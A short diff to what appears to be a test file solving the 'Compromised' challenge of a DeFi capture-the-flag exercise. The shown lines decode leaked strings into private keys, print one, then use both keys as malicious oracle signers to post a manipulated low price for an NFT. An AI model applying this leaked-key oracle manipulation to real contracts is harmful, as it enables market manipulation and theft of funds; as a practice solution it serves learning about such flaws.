@@ -79,6 +79,12 @@ describe("Compromised challenge", function () {
     string = Buffer.from(info.split(" ").join(""), "hex").toString("utf-8");
     key2 = Buffer.from(string, "base64").toString("utf-8");
     console.log(key2);
+    /**Create signers as malicious oracles and post new prices*/
+    const NEW_PRICE = 1n * 10n ** 16n;
+    const signer1 = new ethers.Wallet(key1, ethers.provider);
+    await oracle.connect(signer1).postPrice("DVNFT", NEW_PRICE);
+    const signer2 = new ethers.Wallet(key2, ethers.provider);
+    await oracle.connect(signer2).postPrice("DVNFT", NEW_PRICE);
   });
 
   after(async function () {
